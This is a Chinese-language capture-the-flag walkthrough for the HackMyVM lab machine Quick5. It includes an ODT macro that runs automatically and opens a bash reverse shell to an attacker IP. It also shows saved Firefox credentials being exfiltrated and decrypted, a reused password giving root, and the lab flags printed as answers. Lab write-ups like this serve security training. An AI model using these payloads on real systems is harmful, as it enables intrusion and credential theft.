# Quick5

2025.03.29 https://hackmyvm.eu/machines/machine.php?vm=Quick5

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

添加到 host : customer.quick.hmv

默认 80 什么都没有，扫描 vhost 发现：

```
careers                 [Status: 200, Size: 13819, Words: 3681, Lines: 245, Duration: 41ms]
customer                [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 10ms]
www.careers             [Status: 200, Size: 13819, Words: 3681, Lines: 245, Duration: 69ms]
www.customer            [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 33ms]
employee                [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 112ms]
```

都添加到 host 中: careers.quick.hmv customer.quick.hmv www.careers.quick.hmv www.customer.quick.hmv employee.quick.hmv

扫描域名，发现 http://careers.quick.hmv/apply.php 上传图片显示 Only ODT and PDF are allowed.

odt 中可以写入宏，同时配置 event 在打开文档时自动执行下面的宏：

```
Sub on_open(oEvent As Object)
    Shell("bash -c 'bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'")
End Sub
```

配置好后，在上传 odt，等待几分钟，得到反弹 shell。

拿到 user flag：

```
andrew@quick5:~$ cat user.txt
HMV{f1a85c0f54de51d374e15a73a2d71cd6}
```

其他路径没信息，发现 firefox /home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default 将其打包，传输到 kali 上解密保存的登陆凭据：

```
cd ~/snap/firefox/common/.mozilla/firefox
tar -cvf ii990jpt.default.tar.gz ii990jpt.default
```

使用这个库进行解密：

```
git clone https://github.com/unode/firefox_decrypt.git
python3 firefox_decrypt.py ~/Downloads/z/ii990jpt.default

Website:   http://employee.quick.hmv
Username: 'andrew.speed@quick.hmv'
Password: 'SuperSecretPassword'
```

这个密码不是 andrew 的，尝试是不是 root 的，切换成功，拿到 root flag：

```
HMV{7b243f33c5eb851f1c73fb6d6b3a974a}
```
